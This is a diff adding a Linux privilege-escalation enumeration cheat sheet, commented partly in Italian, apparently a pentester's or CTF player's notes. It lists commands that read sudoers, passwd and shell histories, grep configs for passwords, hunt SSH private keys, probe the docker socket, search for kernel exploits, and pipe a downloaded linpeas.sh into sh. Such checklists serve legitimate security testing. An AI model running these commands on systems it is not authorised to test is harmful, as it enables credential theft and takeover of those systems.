@@ -1,0 +1,83 @@
+IN ORDINE
+# ========== BASIC INFO ==========
+id                              # User, groups, UID
+whoami                          # Current user
+hostname                        # Machine name
+hostnamectl                     # OS, kernel version
+uname -a                        # Kernel info completo
+cat /etc/os-release             # OS dettagliato
+
+# ========== SUDO & PERMISSIONS ==========
+sudo -l                         # Comandi eseguibili come root
+cat /etc/sudoers 2>/dev/null    # File sudoers (se leggibile)
+
+# ========== SUID/SGID BINARIES ==========
+find / -type f -perm -4000 2>/dev/null     # SUID (run as owner)
+find / -type f -perm -2000 2>/dev/null     # SGID (run as group)
+find / -perm -u=s -type f 2>/dev/null      # Altra sintassi SUID
+Cerco binari come potenzialmente vulnerabili (esempio nsudo)
+
+# ========== CAPABILITIES ==========
+getcap -r / 2>/dev/null         # Capabilities speciali
+
+# ========== WRITABLE FILES & DIRS ==========
+find / -writable -type d 2>/dev/null        # Directory scrivibili
+find / -writable -type f 2>/dev/null        # File scrivibili
+find /etc -writable 2>/dev/null             # /etc scrivibile?
+
+# ========== CRON JOBS ==========
+cat /etc/crontab                # Cron di sistema
+ls -la /etc/cron.*              # Cron directories
+crontab -l                      # User cron
+systemctl list-timers           # Systemd timers
+
+# ========== SERVICES & PROCESSES ==========
+ss -tulnp                       # Servizi in ascolto
+ps aux                          # Processi attivi
+systemctl list-units --type=service --state=running  # Servizi systemd
+
+# ========== NETWORK ==========
+ip a                            # Interfacce di rete
+netstat -ano                    # Connessioni di rete (se disponibile)
+cat /etc/hosts                  # Host configurati
+
+# ========== PASSWORDS & SENSITIVE FILES ==========
+ls -la /var/backups             # Backup (password?)
+cat /var/backups/*.bak 2>/dev/null
+ls -la /home/*/.*history        # Command history
+cat ~/.bash_history             # Bash history
+cat ~/.mysql_history            # MySQL history
+find / -name "*.conf" -type f 2>/dev/null | xargs grep -i "password" 2>/dev/null
+find / -name "id_rsa" 2>/dev/null   # SSH keys
+env                             # Environment variables (password?)
+
+# ========== DOCKER & CONTAINERS ==========
+docker ps 2>/dev/null           # Docker containers
+groups | grep docker            # User in docker group?
+ls -la /var/run/docker.sock     # Docker socket writable?
+
+# ========== KERNEL EXPLOITS ==========
+uname -a                        # Kernel version
+searchsploit linux kernel $(uname -r)   # Cerca exploit
+
+# ========== INTERESTING FILES ==========
+find / -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null | grep -v proc
+ls -la /opt                     # Software custom
+ls -la /tmp                     # Temp files
+ls -la /var/tmp                 # Persistent temp
+ls -la /dev/shm                 # Shared memory
+
+# ========== OTHER USERS ==========
+cat /etc/passwd                 # Users list
+cat /etc/group                  # Groups list
+ls -la /home                    # Home directories
+
+# ========== AUTOMATED TOOLS ==========
+# LinPEAS
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# LinEnum
+./LinEnum.sh
+
+# Linux Smart Enumeration
+./lse.sh -l 2
